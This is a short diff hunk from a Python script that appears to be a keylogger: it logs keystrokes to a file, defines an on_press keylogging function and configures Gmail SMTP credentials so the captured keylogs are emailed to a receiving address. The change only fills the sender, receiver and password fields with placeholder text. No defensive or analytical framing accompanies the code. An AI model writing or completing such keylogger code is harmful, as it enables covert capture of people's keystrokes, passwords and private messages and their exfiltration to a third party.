@@ -10,9 +10,9 @@ logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, for
 
 # Set up email
 smtp_server = "smtp.gmail.com" # Use Gmail as the SMTP server
-sender_email = "" # Your email address
-receiver_email = "" # The email address to receive the keylogs
-password = "" # Your email password
+sender_email = " Your email address" # Your email address
+receiver_email = "The email address to receive the keylogs" # The email address to receive the keylogs
+password = "Your email password" # Your email password
 
 # Define the keylogging function
 def on_press(key):
